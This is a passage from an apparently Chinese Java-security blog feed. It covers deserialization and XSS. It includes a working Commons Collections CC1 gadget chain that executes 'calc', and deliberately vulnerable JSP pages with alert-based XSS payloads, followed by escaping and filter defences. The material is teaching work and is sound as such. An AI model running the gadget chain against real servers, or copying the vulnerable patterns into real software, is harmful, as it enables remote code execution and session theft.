class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javatest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformerArray=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),        <span class="comment">//解决了AnnotationInvocationHandler类的readObject()方法调用 的setValue()方法的参数不可控</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformerArray);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后反序列化时调用了AnnotationInvocationHandler类中的readObject();</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化漏洞</title>
      <link href="/2025/08/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/08/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><p>Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection(集合)相关类对象。攻击者利用存在漏洞版本的Apache Commons Collections库的反序列化包发送到服务器端进行反序列化操作就会导致服务器被非法入侵。</p>]]></content>
      
      
      <categories>
          
          <category> Java Web常见漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java Web常见漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Xss漏洞</title>
      <link href="/2025/08/23/java%20Xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/08/23/java%20Xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>攻击者利用XSS(Cross-site scripting)漏洞攻击可以在用户的浏览器中执行JS恶意脚本，XSS攻击可以实现用户会话劫持、钓鱼攻击、恶意重定向、点击劫持、挂马、XSS蠕虫等，XSS攻击类型分为：反射型、存储型、DOM型。</p><h2 id="1-反射型XSS攻击"><a href="#1-反射型XSS攻击" class="headerlink" title="1. 反射型XSS攻击"></a>1. 反射型XSS攻击</h2><p><strong>示例 - 存在反射型XSS的xss.jsp代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=request.getParameter(<span class="string">&quot;input&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>攻击者通过传入恶意的input参数值可以在用户浏览器中注入一段JavaScript脚本。<br>示例 - 注入XSS代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="2-存储型XSS攻击"><a href="#2-存储型XSS攻击" class="headerlink" title="2. 存储型XSS攻击"></a>2. 存储型XSS攻击</h2><p><strong>示例 - 存在存储型XSS的guestbook.jsp代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.text.SimpleDateFormat&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">guestBookKey</span> <span class="operator">=</span> <span class="string">&quot;GUEST_BOOK&quot;</span>;</span><br><span class="line">    List&lt;Map&lt;String, String&gt;&gt; comments = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Map&lt;String, String&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (content != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> application.getAttribute(guestBookKey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">            comments = (List&lt;Map&lt;String, String&gt;&gt;) obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; comment = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="type">String</span>              <span class="variable">ip</span>      <span class="operator">=</span> request.getHeader(<span class="string">&quot;x-real-ip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ip == <span class="literal">null</span>) &#123;</span><br><span class="line">            ip = request.getRemoteAddr();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        comment.put(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        comment.put(<span class="string">&quot;content&quot;</span>, content);</span><br><span class="line">        comment.put(<span class="string">&quot;ip&quot;</span>, ip);</span><br><span class="line">        comment.put(<span class="string">&quot;date&quot;</span>, <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line"></span><br><span class="line">        comments.add(comment);</span><br><span class="line"></span><br><span class="line">        application.setAttribute(guestBookKey, comments);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    * &#123;</span><br><span class="line">        margin: <span class="number">0</span>;</span><br><span class="line">        padding: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;border: 1px solid #C6C6C6;&quot;</span>&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><br><span class="line">        &lt;h2&gt;在线留言板&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;dl&gt;</span><br><span class="line">            &lt;%</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> application.getAttribute(guestBookKey);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">                    comments = (List&lt;Map&lt;String, String&gt;&gt;) obj;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (Map&lt;String, String&gt; comment : comments) &#123;</span><br><span class="line">            %&gt;</span><br><span class="line">            &lt;dd&gt;</span><br><span class="line">                &lt;div style=<span class="string">&quot;min-height: 50px; margin: 20px; border-bottom: 1px solid #9F9F9F;&quot;</span>&gt;</span><br><span class="line">                    &lt;p&gt;&lt;B&gt;&lt;%=comment.get(<span class="string">&quot;username&quot;</span>)%&gt;</span><br><span class="line">                    &lt;/B&gt;[&lt;%=comment.get(<span class="string">&quot;ip&quot;</span>)%&gt;] 于 &lt;%=comment.get(<span class="string">&quot;date&quot;</span>)%&gt; 发表回复：&lt;/p&gt;</span><br><span class="line">                    &lt;p style=<span class="string">&quot;margin: 15px 0 5px 0; font-size: 12px;&quot;</span>&gt;</span><br><span class="line">                    &lt;pre&gt;&lt;%=comment.get(<span class="string">&quot;content&quot;</span>)%&gt;&lt;/pre&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/dd&gt;</span><br><span class="line">            &lt;%</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            %&gt;</span><br><span class="line">        &lt;/dl&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;background-color: #fff; border: 1px solid #C6C6C6;&quot;</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;POST&quot;</span> style=<span class="string">&quot;margin: 20px;&quot;</span>&gt;</span><br><span class="line">            昵称: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> style=<span class="string">&quot;width:250px; height: 28px;&quot;</span>/&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">            &lt;textarea name=<span class="string">&quot;content&quot;</span> style=<span class="string">&quot;overflow: auto;width: 100%; height: 250px;&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交留言&quot;</span> style=<span class="string">&quot;margin-top: 20px; width: 80px; height: 30px;&quot;</span>/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-24%20000738.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-24%20000850.png"></p><h2 id="3-DOM-XSS"><a href="#3-DOM-XSS" class="headerlink" title="3. DOM XSS"></a>3. DOM XSS</h2><p><strong>示例 - dom.jsp代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">Date: &lt;span style=<span class="string">&quot;color: red;&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;&lt;%=request.getParameter(&quot;</span>date<span class="string">&quot;)%&gt;&quot;</span> /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="type">var</span> <span class="variable">date</span> <span class="operator">=</span> document.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    document.getElementsByTagName(<span class="string">&quot;span&quot;</span>)[<span class="number">0</span>].innerHTML = date;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>XSS攻击测试：<br><a href="http://localhost:8000/modules/servlet/dom.jsp?date=%3Cimg%20src=1%20onerror=alert(/xss/)%20/%3E%20/%3E">http://localhost:8000/modules/servlet/dom.jsp?date=%3Cimg%20src=1%20onerror=alert(/xss/)%20/%3E%20/%3E</a></p><h2 id="4-XSS防御"><a href="#4-XSS防御" class="headerlink" title="4. XSS防御"></a>4. XSS防御</h2><p>XSS最为常见的处理方式是转义特殊字符，后端程序在接受任何用户输入的参数时都应当优先考虑是否会存在XSS攻击。</p><h3 id="4-1-htmlspecialchars"><a href="#4-1-htmlspecialchars" class="headerlink" title="4.1 htmlspecialchars"></a>4.1 htmlspecialchars</h3><p>在PHP中通常会使用htmlspecialchars函数会将一些可能有攻击威胁的字符串转义为html实体编码，这样可以有效的避免XSS攻击。</p><p><strong>示例 - htmlspecialchars 转义：</strong></p><table><thead><tr><th>字符</th><th>替换后</th></tr></thead><tbody><tr><td>&amp; (&amp; 符号)</td><td>&amp;amp;</td></tr><tr><td>“ (双引号)</td><td>&amp;quot;</td></tr><tr><td>‘ (单引号)</td><td>&amp;#039;或者&amp;apos;</td></tr><tr><td>&lt; (小于)</td><td>&amp;lt;</td></tr><tr><td>&gt; (大于)</td><td>&amp;gt;</td></tr></tbody></table><p>在Java中虽然没有内置如此简单方便的函数，但是我们可以通过字符串替换的方式实现类似htmlspecialchars函数的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现htmlSpecialChars函数把一些预定义的字符转换为HTML实体编码</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> content 输入的字符串内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> HTML实体化转义后的字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">htmlSpecialChars</span><span class="params">(String content)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (content == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>[]        charArray = content.toCharArray();</span><br><span class="line">  <span class="type">StringBuilder</span> <span class="variable">sb</span>        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">char</span> c : charArray) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        sb.append(<span class="string">&quot;&amp;amp;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        sb.append(<span class="string">&quot;&amp;quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">        sb.append(<span class="string">&quot;&amp;#039;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">        sb.append(<span class="string">&quot;&amp;lt;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">        sb.append(<span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sb.append(c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-全局的XSSFilter"><a href="#4-2-全局的XSSFilter" class="headerlink" title="4.2 全局的XSSFilter"></a>4.2 全局的XSSFilter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.vuls.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XSSFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HttpServletRequestWrapper，包装原HttpServletRequest对象，示例程序只重写了getParameter方法，</span></span><br><span class="line">        <span class="comment">// 应当考虑如何过滤：getParameter、getParameterValues、getParameterMap、getInputStream、getReader</span></span><br><span class="line">        <span class="type">HttpServletRequestWrapper</span> <span class="variable">requestWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServletRequestWrapper</span>(request) &#123;</span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getParameter</span><span class="params">(String name)</span> &#123;</span><br><span class="line">                <span class="comment">// 获取参数值</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.getParameter(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 简单转义参数值中的特殊字符</span></span><br><span class="line">                <span class="keyword">return</span> value.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&amp;#039;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(requestWrapper, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml添加XSSFilter过滤器：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XSSFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.anbai.sec.vuls.filter.XSSFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XSSFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>经过全局过滤器转义后的参数就不会再带有XSS攻击能力了。<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-24%20001912.png"></p><h3 id="4-3-RASP-XSS攻击防御"><a href="#4-3-RASP-XSS攻击防御" class="headerlink" title="4.3 RASP XSS攻击防御"></a>4.3 RASP 